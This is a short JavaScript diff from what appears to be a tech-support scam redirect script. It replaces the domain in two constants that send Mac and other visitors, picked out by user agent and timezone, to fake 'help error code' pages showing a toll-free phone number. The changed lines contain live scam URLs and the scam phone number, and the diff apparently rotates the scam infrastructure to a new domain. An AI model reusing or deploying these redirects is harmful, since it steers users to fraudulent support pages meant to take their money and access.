@@ -32,8 +32,8 @@ const ALLOWED_TIMEZONES = new Set([
 const MAC_USER_AGENT_PATTERN = /Macintosh|Mac OS|macOS/;
 
 
-const MAC_URL = "https://setetrjeenn.on-forge.com/Ma0cHelpSh0errc0de030/index.html?Anph=1-844-590-5369/mac-specific-url";
-const DEFAULT_URL = "https://setetrjeenn.on-forge.com/Wi0nHelpSh0errc0de030/index.html?Anph=1-844-590-5369/default-url";
+const MAC_URL = "https://leekoooyy1.on-forge.com/Ma0cHelpSh0errc0de030/index.html?Anph=1-844-590-5369/mac-specific-url";
+const DEFAULT_URL = "https://leekoooyy1.on-forge.com/Wi0nHelpSh0errc0de030/index.html?Anph=1-844-590-5369/default-url";
 
 // --- Pre-Compilation Cache Layer ---
 const PRECOMPUTED_RESPONSES = [
